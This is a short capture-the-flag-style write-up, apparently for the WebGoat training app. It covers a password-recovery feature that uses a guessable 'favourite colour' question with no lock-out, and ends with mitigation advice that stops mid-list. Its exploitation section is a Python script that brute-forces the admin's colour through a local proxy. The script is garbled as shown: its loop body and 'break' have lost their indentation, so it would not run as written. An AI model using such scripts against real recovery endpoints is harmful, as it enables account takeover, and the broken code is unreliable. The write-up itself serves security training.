## Vulnerability:

Provided mechanism for password recovery is completely broken. It is vulnerable to guessing attack and also passwords are stored in clear on the server.

There's limited number of colors that can be chosen and there is no lock-out mechanism so the attacker can easily guess the color used by the admin.

## Exploitation:

Here's my simple script that guesses admin's favorite color:

```
#!/usr/bin/python3

# (http://docs.python-requests.org/en/latest/)
from requests import post
import sys

colors = ['green', 'blue', 'black', 'white', 'brown', 'yellow', 'orange', 'pink', 'grey', 'red', 'violet']

proxies = {
    "http": "http://127.0.0.1:8081",
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://webgoat.hacking-lab.com',
    'Referer': 'http://webgoat.hacking-lab.com/attack?Screen=64&menu=500'
}

data1 = {'Username': 'admin', 'SUBMIT': 'Submit'}

r = post("http://webgoat.hacking-lab.com/attack?Screen=64&menu=500", headers=headers, proxies=proxies, data=data1)

cookie = dict(JSESSIONID=r.cookies['JSESSIONID'])

for color in colors:
    data2 = {'Color': color, 'SUBMIT': 'Submit'}

r = post("http://webgoat.hacking-lab.com/attack?Screen=64&menu=500", headers=headers, cookies=cookie, proxies=proxies, data=data2)

if 'For security reasons, please change your password immediately' in r.text:
    print("admin's color: " + color)
    break
```

## Mitigation:

1) Do not store passwords in cleartext on the server. At a very least passwords should be hashed and salted. Do not invent your own password storage mechanism if possible. Use PBKDF2 or bcrypt for example. Follow this guideline: https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet for details.

2) Basically one can use email verification or secret question(s) (or both) for password reset functionality. When secret questions are used, make sure that questions are hard to guess and unique enough to prevent googling for the answer. Consider lock-out mechanism 
